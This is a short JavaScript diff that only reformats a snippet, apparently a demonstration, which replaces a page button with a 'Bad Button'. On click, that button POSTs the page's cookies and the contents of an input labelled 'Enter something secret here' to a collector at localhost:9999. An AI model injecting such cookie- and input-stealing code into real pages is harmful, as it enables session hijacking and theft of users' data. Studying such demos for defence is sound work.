@@ -4,14 +4,14 @@ const newButton = button.cloneNode();
 button.parentElement.replaceChild(newButton, button);
 newButton.textContent = "Bad Button";
 newButton.addEventListener("click", () => {
-    sendReq();
-    fetch("http://localhost:9999", {
-        method: "POST",
-        body: JSON.stringify({
-            cookie: document.cookie,
-            input: input.value
-        })
-    });
+  sendReq();
+  fetch("http://localhost:9999", {
+    method: "POST",
+    body: JSON.stringify({
+      cookie: document.cookie,
+      input: input.value,
+    }),
+  });
 });
 input.value = "";
 input.placeholder = "Enter something secret here";
